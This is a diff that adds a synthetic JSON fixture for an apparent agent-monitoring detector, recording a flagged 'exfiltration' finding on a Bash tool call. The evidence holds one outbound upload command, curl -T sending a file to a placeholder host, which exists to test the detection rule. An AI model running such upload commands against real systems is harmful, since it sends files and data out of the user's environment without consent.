@@ -1,0 +1,67 @@
+{
+  "schema": "telltale.action.v2",
+  "telltale_version": "0.8.0",
+  "semantic_identity": "semantic:v1:sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+  "client": "codex",
+  "source_id": "codex.sessions",
+  "source_path_hash": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
+  "session_id": "synthetic-session",
+  "session_event_id": null,
+  "coordinate": "obs:v2:sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+  "replay_identity": "replay:v1:sha256:eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
+  "detector_kind": "rule_v1_action",
+  "finding_kind": "atomic",
+  "observation_family": "tool",
+  "stage": "tool_requested",
+  "tool_name": "Bash",
+  "occurred_at": "2026-10-20T12:00:01.000Z",
+  "timeline_index": 1,
+  "severity": "high",
+  "promotion_score": 25,
+  "rule_ids": ["exfil.outbound_upload"],
+  "categories": ["exfiltration"],
+  "contributions": [
+    {"id": "exfil.outbound_upload", "type": "deterministic_rule", "points": 25, "rationale": "upload command"}
+  ],
+  "evidence": [
+    {
+      "field": "command",
+      "rule_id": "exfil.outbound_upload",
+      "redacted_value": "curl -T synthetic.txt https://uploads.example.invalid/artifacts",
+      "highlight": {"start": 0, "end": 4},
+      "elided_before": false,
+      "elided_after": false
+    }
+  ],
+  "supporting_observation_ids": [
+    "obs:v2:sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+  ],
+  "canonical_findings": [
+    {
+      "finding_id": "fnd:v2:sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+      "signal_ids": ["sig:v2:sha256:1111111111111111111111111111111111111111111111111111111111111111"],
+      "observation_ids": ["obs:v2:sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"],
+      "detector_id": "exfil.outbound_upload",
+      "finding_kind": "security_detection",
+      "category": "exfiltration",
+      "severity": "high",
+      "risk_points": 25
+    }
+  ],
+  "context": [
+    {
+      "offset": -1,
+      "kind": "user_message",
+      "stage": "message_observed",
+      "occurred_at": null,
+      "tool_name": null,
+      "redacted_text": "Upload the synthetic test artifact"
+    }
+  ],
+  "destinations": {
+    "destinations": ["uploads.example.invalid/artifacts"],
+    "complete": true,
+    "local_only": false
+  },
+  "call_id": null
+}
